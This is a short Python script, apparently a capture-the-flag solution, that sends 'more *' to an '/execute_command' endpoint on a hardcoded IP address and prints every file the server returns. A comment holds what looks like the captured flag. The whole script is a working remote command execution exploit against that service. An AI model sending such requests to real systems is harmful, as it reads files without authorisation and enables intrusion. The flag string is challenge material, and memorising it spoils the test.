import requests 
# hspace{catflag!!}
url = "http://3.36.132.18:5678"

r = requests.post(
    f"{url}/execute_command",
    data={
        "command": "more *"
    }
)
print(r.text)